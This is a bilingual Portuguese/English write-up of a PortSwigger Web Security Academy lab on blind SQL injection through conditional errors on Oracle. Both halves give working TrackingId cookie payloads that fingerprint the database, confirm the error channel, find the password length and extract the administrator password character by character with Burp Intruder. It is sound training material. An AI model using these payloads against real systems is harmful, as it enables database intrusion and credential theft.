# Lab 12 — Blind SQL Injection with Conditional Errors

> 🇧🇷 [Português](#-português) · 🇺🇸 [English](#-english)

---

## 🇧🇷 Português

**Plataforma:** PortSwigger Web Security Academy  
**Categoria:** SQL Injection — Blind  
**Dificuldade:** 🟡 Practitioner  
**Data:** 2026-06-07

### Descrição

Blind SQLi em banco Oracle via cookie `TrackingId`. Desta vez não há mensagem de `Welcome back` — o único canal disponível é a presença ou ausência de um erro HTTP 500. O objetivo é extrair a senha do `administrator`.

### Conceito

Quando não há variação no conteúdo da resposta para condições verdadeiras/falsas, o canal de inferência muda para **erros condicionais**: injeta-se uma divisão por zero (`1/0`) condicionada a uma expressão booleana. Se a condição for verdadeira → erro 500. Se falsa → resposta normal.

No Oracle, a expressão `CASE WHEN (condição) THEN TO_CHAR(1/0) ELSE '' END` força um erro aritmético apenas quando a condição avaliada é verdadeira.

### Reconhecimento

**Confirmando sintaxe Oracle:**

```
TrackingId=xyz'||(SELECT '' FROM dual)||'
```
Sem erro — banco é Oracle (exige `FROM` em todo `SELECT`).

**Confirmando que erros são detectáveis:**

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
→ Erro 500 (condição verdadeira → divisão por zero)

```
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
→ Resposta normal (condição falsa → sem erro)

Canal confirmado.

**Confirmando usuário `administrator`:**

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
→ Erro 500 — usuário existe.

### Exploração

**Descobrindo tamanho da senha** (incrementando até o erro parar):

```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Senha tem **20 caracteres**.

**Extraindo cada caractere com Burp Intruder:**

```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Filtrar por status HTTP 500 na coluna "Status" do Intruder — o payload que gerou 500 é o caractere correto para aquela posição.

### O que aprendi

- Quando não há variação de conteúdo, erros HTTP são o próximo canal de inferência a explorar
- `CASE WHEN ... THEN TO_CHAR(1/0) ELSE '' END` é a expressão padrão para erros condicionais no Oracle
- `SUBSTR()` no Oracle equivale a `SUBSTRING()` em outros bancos
- Status HTTP 500 vs 200 substitui o Grep Match do lab anterior como indicador

### Referências

- [PortSwigger — Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
- [PortSwigger — SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

## 🇺🇸 English

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection — Blind  
**Difficulty:** 🟡 Practitioner  
**Date:** 2026-06-07

### Description

Blind SQLi on an Oracle database via `TrackingId` cookie. This time there's no `Welcome back` message — the only available channel is the presence or absence of an HTTP 500 error. The goal is to extract the `administrator` password.

### Concept

When there's no content variation in the response for true/false conditions, the inference channel shifts to **conditional errors**: a divide-by-zero (`1/0`) is injected conditioned on a boolean expression. If the condition is true → 500 error. If false → normal response.

In Oracle, the expression `CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE '' END` forces an arithmetic error only when the evaluated condition is true.

### Reconnaissance

**Confirming Oracle syntax:**

```
TrackingId=xyz'||(SELECT '' FROM dual)||'
```
No error — database is Oracle (requires `FROM` in every `SELECT`).

**Confirming errors are detectable:**

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
→ 500 error (true condition → divide by zero)

```
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
→ Normal response (false condition → no error)

Channel confirmed.

**Confirming `administrator` user:**

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
→ 500 error — user exists.

### Exploitation

**Finding password length** (incrementing until error stops):

```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Password is **20 characters** long.

**Extracting each character with Burp Intruder:**

```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Filter by HTTP 500 status in Intruder's "Status" column — the payload that generated 500 is the correct character for that position.

### What I learned

- When there's no content variation, HTTP errors are the next inference channel to explore
- `CASE WHEN ... THEN TO_CHAR(1/0) ELSE '' END` is the standard conditional error expression in Oracle
- Oracle's `SUBSTR()` is equivalent to `SUBSTRING()` in other databases
- HTTP 500 vs 200 status replaces the previous lab's Grep Match as the indicator

### References

- [PortSwigger — Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
- [PortSwigger — SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
